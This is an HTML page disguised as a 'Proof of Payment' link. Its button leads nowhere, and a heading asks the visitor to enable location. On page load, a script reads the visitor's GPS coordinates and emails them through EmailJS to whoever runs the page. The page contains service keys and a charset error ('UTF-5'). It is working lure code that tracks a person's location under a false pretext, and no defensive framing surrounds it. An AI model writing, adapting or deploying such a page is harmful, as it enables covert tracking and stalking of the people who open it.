<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-5">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
</head>
<body>
    <h1>Click for Proof of Payment</h1>
    <h1>Please enable Location</h1>

     <button id="proofOfPaymentButton" onclick="doNothing()">Proof of Payment</button>

    <script>
        (function() {
            emailjs.init("614HG-vm71ufAzV-E"); // Replace with your EmailJS public key
        })();

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError);
            } else {
                console.error("Geolocation is not supported by this browser.");
            }
        }

        function sendLocation(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;

            const templateParams = {
                latitude: lat,
                longitude: lng,
                to_name: 'Anon', // Change as needed
                from_name: 'Intrepid', // Change as needed
                message: 'Here is my GPS location.'
            };

            emailjs.send('service_79zgaqg', 'template_56xx4ux', templateParams)
                .then((response) => {
                    console.log('SUCCESS!', response.status, response.text);
                }, (error) => {
                    console.error('FAILED...', error);
                });
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    console.error("User denied the request for Geolocation.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    console.error("Location information is unavailable.");
                    break;
                case error.TIMEOUT:
                    console.error("The request to get user location timed out.");
                    break;
                case error.UNKNOWN_ERROR:
                    console.error("An unknown error occurred.");
                    break;
            }
        }

        // Automatically call getLocation when the page loads
        window.onload = getLocation;
    </script>
</body>
</html>
